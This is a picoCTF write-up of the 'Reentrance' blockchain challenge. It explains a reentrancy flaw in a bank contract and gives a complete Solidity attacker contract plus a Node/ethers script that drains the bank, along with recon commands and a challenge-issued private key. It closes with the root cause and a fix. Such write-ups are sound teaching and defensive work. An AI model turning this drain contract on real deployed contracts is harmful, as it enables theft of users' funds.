---
title: "Reentrance Writeup"
description: "picoCTF Reentrance writeup deploying an attacker contract to exploit the classic reentrancy vulnerability and drain the bank contract to zero."
category: "picoCTF - Blockchain"
tags: ["picoctf", "blockchain"]
published: true
---
# Reentrance Writeup

Flag: picoCTF{<redacted>}

## Summary

This challenge is a classic reentrancy bug.

The vulnerable bank sends Ether to the caller before it updates the caller's internal balance. If the caller is a contract, its `receive()` function runs as soon as the Ether arrives. That callback can immediately call `withdraw()` again while the bank still believes the original balance is intact.

Because the challenge reveals the flag when the bank's on-chain balance reaches `0`, the exploit is to:

1. Deploy an attacker contract.
2. Deposit a small amount into the bank from that contract.
3. Call `withdraw()` once.
4. Re-enter `withdraw()` repeatedly from `receive()` until the bank is fully drained.

## Challenge Details

- Web UI: `http://crystal-peak.picoctf.net:53465/`
- RPC: `http://crystal-peak.picoctf.net:52781`
- Target bank: `0x6Fd09d4d9795a3e07EdDBD9a82c882B46a5A6deF`
- Player address: `0x68146Ba96F4aCaE3eD690cfd78C2CafA6B4b041C`
- Player private key: `0x47e7fe6e77a8ce43619e9e1c8414d4991633c3b8c6745a435ecadc0b53382691`
- Bank starting balance: `10 ETH`
- Player starting balance: `5 ETH`

## Tools Used

- `curl`
- `node`
- `npm install ethers`
- `npm install solc`
- `ethers` from `/tmp/node_modules`
- raw JSON-RPC calls for code and balance checks

## Recon

### Pull the challenge page and status

```bash
curl -L http://crystal-peak.picoctf.net:53465/
curl -s http://crystal-peak.picoctf.net:53465/status
```

### Read the deployed bytecode

```bash
curl -s -X POST http://crystal-peak.picoctf.net:52781 \
  -H 'Content-Type: application/json' \
  --data '{"jsonrpc":"2.0","method":"eth_getCode","params":["0x6Fd09d4d9795a3e07EdDBD9a82c882B46a5A6deF","latest"],"id":1}'
```

### Check the bank's ETH balance

```bash
curl -s -X POST http://crystal-peak.picoctf.net:52781 \
  -H 'Content-Type: application/json' \
  --data '{"jsonrpc":"2.0","method":"eth_getBalance","params":["0x6Fd09d4d9795a3e07EdDBD9a82c882B46a5A6deF","latest"],"id":1}'
```

The bank started with:

```text
0x8ac7230489e80000 = 10 ETH
```

## Vulnerability Analysis

The critical logic in `withdraw(uint256)` is effectively:

```solidity
require(amount <= balances[msg.sender], "Insufficient funds available");

(bool ok,) = msg.sender.call{value: amount}("");
require(ok, "Transfer failed");

balances[msg.sender] -= amount;
```

That ordering is the bug.

### Why it is vulnerable

- The bank checks the balance first.
- Then it sends Ether to `msg.sender`.
- If `msg.sender` is a contract, that contract's `receive()` function runs immediately.
- At that moment, the bank has not reduced `balances[msg.sender]` yet.
- So the attacker contract can call `withdraw(amount)` again and pass the same balance check repeatedly.

This is the textbook reentrancy pattern: interaction before state update.

### Flag condition

The contract reveals the flag when the bank contract's own ETH balance hits zero.

That means the attack goal is not just “steal some Ether,” but “drain all Ether from the bank.”

## Exploit Strategy

Use an attacker contract with three parts:

1. `attack()` deposits `1 ETH` into the bank and immediately starts the first withdrawal.
2. `receive()` runs whenever the bank sends Ether back.
3. Inside `receive()`, if the bank still has at least `1 ETH`, call `withdraw(1 ether)` again.

### Why 1 ETH works

- The bank started with `10 ETH`.
- The attacker contract first deposits `1 ETH`, so the bank temporarily holds `11 ETH`.
- The attacker contract's internal bank balance is `1 ETH`.
- Because the bank only updates that internal balance after the external call returns, each nested withdrawal still sees `balances[attacker] == 1 ether`.
- Re-entering `11` times drains the full bank balance to `0`.

## Attacker Contract

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity >=0.6.12 <0.9.0;

interface IVulBank {
    function deposit() external payable;
    function withdraw(uint256 amount) external;
    function getFlag() external view returns (string memory);
}

contract ReentranceAttacker {
    IVulBank public bank;
    address payable public owner;
    uint256 public amount;

    constructor(address _bank) {
        bank = IVulBank(_bank);
        owner = payable(msg.sender);
    }

    function attack() external payable {
        require(msg.sender == owner, "owner");
        require(msg.value > 0, "value");

        amount = msg.value;
        bank.deposit{value: msg.value}();
        bank.withdraw(msg.value);
    }

    receive() external payable {
        uint256 bankBal = address(bank).balance;
        if (bankBal >= amount) {
            bank.withdraw(amount);
        }
    }

    function sweep() external {
        require(msg.sender == owner, "owner");
        owner.transfer(address(this).balance);
    }
}
```

## Full Solve Flow

### Install dependencies

```bash
cd /tmp
npm install ethers
npm install solc
```

### Compile, deploy, attack, and read the flag

```bash
node - <<'NODE'
const solc = require('/tmp/node_modules/solc');
const { ethers } = require('/tmp/node_modules/ethers');

const source = `// SPDX-License-Identifier: UNLICENSED
pragma solidity >=0.6.12 <0.9.0;

interface IVulBank {
    function deposit() external payable;
    function withdraw(uint256 amount) external;
    function getFlag() external view returns (string memory);
}

contract ReentranceAttacker {
    IVulBank public bank;
    address payable public owner;
    uint256 public amount;

    constructor(address _bank) {
        bank = IVulBank(_bank);
        owner = payable(msg.sender);
    }

    function attack() external payable {
        require(msg.sender == owner, 'owner');
        require(msg.value > 0, 'value');
        amount = msg.value;
        bank.deposit{value: msg.value}();
        bank.withdraw(msg.value);
    }

    receive() external payable {
        uint256 bal = address(bank).balance;
        if (bal >= amount) {
            bank.withdraw(amount);
        }
    }

    function sweep() external {
        require(msg.sender == owner, 'owner');
        owner.transfer(address(this).balance);
    }
}`;

const input = {
  language: 'Solidity',
  sources: { 'ReentranceAttacker.sol': { content: source } },
  settings: { outputSelection: { '*': { '*': ['abi', 'evm.bytecode.object'] } } }
};

const output = JSON.parse(solc.compile(JSON.stringify(input)));
const c = output.contracts['ReentranceAttacker.sol']['ReentranceAttacker'];
const abi = c.abi;
const bytecode = '0x' + c.evm.bytecode.object;

const rpc = 'http://crystal-peak.picoctf.net:52781';
const pk = '0x47e7fe6e77a8ce43619e9e1c8414d4991633c3b8c6745a435ecadc0b53382691';
const bankAddr = '0x6Fd09d4d9795a3e07EdDBD9a82c882B46a5A6deF';

(async () => {
  const provider = new ethers.JsonRpcProvider(rpc);
  const wallet = new ethers.Wallet(pk, provider);
  const bank = new ethers.Contract(bankAddr, ['function getFlag() view returns (string memory)'], provider);

  const factory = new ethers.ContractFactory(abi, bytecode, wallet);
  const attacker = await factory.deploy(bankAddr);
  await attacker.waitForDeployment();

  let tx = await attacker.attack({ value: ethers.parseEther('1') });
  await tx.wait();

  tx = await attacker.sweep();
  await tx.wait();

  const flag = await bank.getFlag();
  console.log(flag);
})();
NODE
```

## What Happened On-Chain

Observed during the solve:

- Bank balance before attack: `10000000000000000000` wei (`10 ETH`)
- Attacker contract deployed at: `0xf0be961E0ed50020AEA40F6a351D66a9eCBa2DdB`
- Attack transaction: `0x1a3f4af94d45b7f330bf88b14f1dca3bb81cdf41f793df0e538adbae4bb87eea`
- Bank balance after attack: `0`
- Attacker contract balance after drain: `11000000000000000000` wei (`11 ETH`)

The extra `1 ETH` is the attacker's original deposit, recovered along with the stolen funds.

## Verification

### Challenge status endpoint

```bash
curl -s http://crystal-peak.picoctf.net:53465/status
```

### Result

```text
picoCTF{<redacted>}
```

## Root Cause

This bug exists because the contract violates the Checks-Effects-Interactions pattern.

Correct order should be:

1. Check preconditions.
2. Update internal state.
3. Interact with external contracts.

The vulnerable contract instead does:

1. Check.
2. Interact.
3. Update state.

That ordering allows a malicious contract to re-enter before its balance is reduced.

## Fix

The direct fix is to subtract the balance before the external call:

```solidity
function withdraw(uint256 amount) external {
    require(amount <= balances[msg.sender], "Insufficient funds available");

    balances[msg.sender] -= amount;

    (bool ok,) = msg.sender.call{value: amount}("");
    require(ok, "Transfer failed");
}
```

Additional defenses:

- Use OpenZeppelin `ReentrancyGuard`.
- Prefer pull-payment designs carefully.
- Minimize external calls in sensitive accounting paths.
